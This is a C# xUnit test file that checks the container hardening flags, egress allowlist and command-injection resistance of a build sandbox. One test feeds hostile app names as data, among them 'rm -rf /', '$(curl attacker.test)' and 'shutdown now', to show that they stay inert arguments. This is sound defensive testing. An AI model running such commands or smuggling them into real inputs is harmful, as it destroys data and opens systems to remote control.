using FluentAssertions;
using Microsoft.Extensions.Options;
using Shellwright.Orchestrator.Activities;
using Shellwright.Orchestrator.Sandbox;
using Shellwright.Orchestrator.Workflows;
using Xunit;

namespace Shellwright.Orchestrator.Tests;

/// <summary>
/// The container flags, and the injection surface they sit behind.
/// </summary>
/// <remarks>
/// ⚠️ These assert that the right arguments are produced. They do not, and
/// cannot here, assert that Docker honours them — there is no container runtime
/// in this environment. That distinction is recorded in the sprint review
/// rather than glossed: a missing hardening flag has no symptom, and neither
/// does a flag the runtime silently ignores.
/// </remarks>
public sealed class SandboxHardeningTests
{
    private static readonly RunnerLease Lease = new(
        "lease-abc",
        "runner-1",
        "/var/lib/shellwright/workspaces/lease-abc",
        "/var/lib/shellwright/caches/app/Android");

    /// <summary>Each flag, with the failure it prevents.</summary>
    [Theory]
    [InlineData("--read-only", "a build could write into the image")]
    [InlineData("--cap-drop", "a build would hold kernel capabilities it has no use for")]
    [InlineData("no-new-privileges", "a setuid binary could undo the unprivileged user")]
    [InlineData("--user", "a build would run as root")]
    [InlineData("--memory", "an unbounded Gradle daemon would take the host's Postgres with it")]
    [InlineData("--cpus", "one build could starve every other")]
    [InlineData("--pids-limit", "a fork bomb would be a denial of service on the whole fleet")]
    [InlineData("--network", "a build would reach the whole internet")]
    [InlineData("--rm", "containers would accumulate until the disk filled")]
    public void The_run_arguments_include(string flag, string because)
    {
        var arguments = SandboxHardening.RunArguments(
            "shellwright-build-1",
            "shellwright/runner-android:latest",
            "/workspaces/1",
            "/caches/1",
            "shellwright-build");

        arguments.Should().Contain(flag, "without it {0}", because);
    }

    /// <summary>Memory and swap are bounded together, or the limit is a suggestion.</summary>
    /// <remarks>
    /// ⚠️ Setting <c>--memory</c> without <c>--memory-swap</c> lets a container
    /// swap past its limit rather than being killed, which on a host with swap
    /// turns a memory cap into a latency cliff for everything else.
    /// </remarks>
    [Fact]
    public void Memory_and_swap_are_bounded_to_the_same_value()
    {
        var arguments = SandboxHardening.RunArguments("c", "i", "/w", "/c", "n").ToList();

        var memory = arguments[arguments.IndexOf("--memory") + 1];
        var swap = arguments[arguments.IndexOf("--memory-swap") + 1];

        swap.Should().Be(memory);
    }

    /// <summary>The scratch mount is the only writable bind, and it is a bind rather than a volume.</summary>
    [Fact]
    public void The_workspace_is_mounted_at_the_scratch_path()
    {
        var arguments = SandboxHardening.RunArguments("c", "i", "/host/work", "/host/cache", "n");

        arguments.Should().Contain(x => x.Contains($"target={SandboxHardening.ScratchMount}", StringComparison.Ordinal));
        arguments.Should().Contain(x => x.Contains("source=/host/work", StringComparison.Ordinal));
    }

    /// <summary>The user is not root and does not match a real account.</summary>
    [Fact]
    public void The_build_user_is_unprivileged()
    {
        SandboxHardening.User.Should().Be("10001:10001");
        SandboxHardening.User.Should().NotStartWith("0:");
    }

    /// <summary>The egress list is short, and contains only package hosts.</summary>
    [Fact]
    public void The_egress_allowlist_is_only_package_hosts()
    {
        SandboxHardening.EgressAllowlist.Should().OnlyContain(
            host => host.EndsWith("google.com", StringComparison.Ordinal)
                || host.EndsWith("gradle.org", StringComparison.Ordinal)
                || host.EndsWith("apache.org", StringComparison.Ordinal));

        SandboxHardening.EgressAllowlist.Should().HaveCountLessThan(10,
            "a long allowlist is a blocklist wearing a disguise");
    }

    /// <summary>
    /// TC-S07-BLD-026 — a hostile app name is an argument, never a command.
    /// </summary>
    /// <remarks>
    /// ⚠️ The whole reason commands are argument arrays. Every value that
    /// reaches a build command came from a customer's configuration, and
    /// <c>Foo"; rm -rf / #</c> is a legal app name.
    /// </remarks>
    [Theory]
    [InlineData("Foo\"; rm -rf / #")]
    [InlineData("$(curl attacker.test)")]
    [InlineData("`id`")]
    [InlineData("app && shutdown now")]
    [InlineData("name\nwith\nnewlines")]
    public void A_hostile_app_name_never_becomes_a_command(string hostileName)
    {
        var options = Options.Create(new SandboxOptions
        {
            Image = "img",
            Network = "net",
            WorkspaceRoot = "/w",
            CacheRoot = "/c",
        });

        var sandbox = new DockerBuildSandbox(options);

        var command = new SandboxCommand(
            "./gradlew",
            ["assembleRelease", $"-PappName={hostileName}"],
            "/workspace");

        var arguments = sandbox.ArgumentsFor(Lease, command);

        // The hostile value survives as exactly one argument. Nothing has split
        // it, quoted it, or joined it to anything — which is what would have to
        // happen for a shell to see it.
        arguments.Should().ContainSingle(x => x == $"-PappName={hostileName}");
        arguments.Should().NotContain(x => x.Contains("&&", StringComparison.Ordinal) && x != $"-PappName={hostileName}");
    }

    /// <summary>The build command itself never invokes a shell.</summary>
    [Fact]
    public void The_build_command_is_not_a_shell()
    {
        var request = new BuildRequest(
            Guid.NewGuid(),
            Guid.NewGuid(),
            Guid.NewGuid(),
            Guid.NewGuid(),
            BuildPlatform.Android,
            BuildType.Release);

        var command = BuildCommands.For(request, new GeneratedProject("/workspace", 46));

        command.Executable.Should().Be("./gradlew");
        command.Executable.Should().NotBe("sh");
        command.Executable.Should().NotBe("bash");
        command.Arguments.Should().Contain("assembleRelease");
        command.Arguments.Should().Contain("--no-daemon");
    }

    /// <summary>Gradle's memory is bounded in the environment as well as by the container.</summary>
    [Fact]
    public void Gradle_memory_is_bounded()
    {
        var request = new BuildRequest(
            Guid.NewGuid(),
            Guid.NewGuid(),
            Guid.NewGuid(),
            Guid.NewGuid(),
            BuildPlatform.Android,
            BuildType.Debug);

        var command = BuildCommands.For(request, new GeneratedProject("/workspace", 46));

        command.Environment.Should().ContainKey("GRADLE_OPTS");
        command.Environment!["GRADLE_OPTS"].Should().Contain("-Xmx");
    }

    /// <summary>iOS is refused with an explanation rather than producing a Gradle command.</summary>
    [Fact]
    public void An_ios_build_is_refused_until_there_is_a_mac()
    {
        var request = new BuildRequest(
            Guid.NewGuid(),
            Guid.NewGuid(),
            Guid.NewGuid(),
            Guid.NewGuid(),
            BuildPlatform.Ios,
            BuildType.Release);

        var build = () => BuildCommands.For(request, new GeneratedProject("/workspace", 28));

        build.Should().Throw<NotSupportedException>().WithMessage("*macOS runner*");
    }

    /// <summary>
    /// The unisolated sandbox refuses to exist unless somebody said so.
    /// </summary>
    /// <remarks>
    /// ⚠️ A deployment must not be able to reach it by forgetting something.
    /// </remarks>
    [Fact]
    public void The_local_sandbox_refuses_unless_explicitly_allowed()
    {
        var options = Options.Create(new SandboxOptions { AllowUnisolatedSandbox = false });

        var create = () => new LocalBuildSandbox(options);

        create.Should().Throw<InvalidOperationException>().WithMessage("*no isolation*");
    }

    /// <summary>The two sandboxes report their isolation honestly.</summary>
    [Fact]
    public void Isolation_is_reported_honestly()
    {
        var docker = new DockerBuildSandbox(Options.Create(new SandboxOptions()));
        var local = new LocalBuildSandbox(Options.Create(new SandboxOptions
        {
            AllowUnisolatedSandbox = true,
            WorkspaceRoot = Path.GetTempPath(),
            CacheRoot = Path.GetTempPath(),
        }));

        docker.IsIsolated.Should().BeTrue();
        local.IsIsolated.Should().BeFalse();
    }
}
